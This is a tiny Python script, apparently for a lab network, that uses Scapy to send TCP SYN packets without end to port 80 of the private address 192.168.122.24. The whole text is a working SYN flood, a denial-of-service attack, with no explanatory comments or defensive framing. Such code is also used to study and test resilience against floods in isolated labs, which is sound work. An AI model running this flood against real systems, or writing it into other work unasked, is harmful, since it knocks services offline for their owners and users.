from scapy.all import *

target = "192.168.122.24"

while True:
    send(
        IP(dst=target)/
        TCP(
            dport=80,
            flags="S"
        ),
        verbose=False
    )
